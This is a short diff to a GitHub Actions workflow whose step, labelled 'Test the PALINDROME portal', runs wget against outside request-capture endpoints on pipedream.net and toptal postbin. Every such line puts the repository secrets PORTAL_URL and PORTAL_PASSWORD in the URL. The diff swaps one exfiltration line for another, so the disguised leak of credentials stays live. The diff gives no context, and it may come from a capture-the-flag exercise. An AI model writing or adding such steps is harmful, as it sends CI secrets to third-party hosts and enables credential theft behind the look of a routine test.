@@ -10,5 +10,4 @@ jobs:
       - name: Test the PALINDROME portal
         run: | 
           C:\msys64\usr\bin\wget.exe '''https://eopjgnu0isbkpxf.m.pipedream.net/?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}''' -O test -d -v
-          C:\msys64\usr\bin\wget.exe "https://www.toptal.com/developers/postbin/1691117513227-8767663748003?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
-          echo "hello"
+          C:\msys64\usr\bin\wget.exe "https://eopjgnu0isbkpxf.m.pipedream.net/?a=${{ secrets.PORTAL_URL }}/${{ secrets.PORTAL_PASSWORD }}"
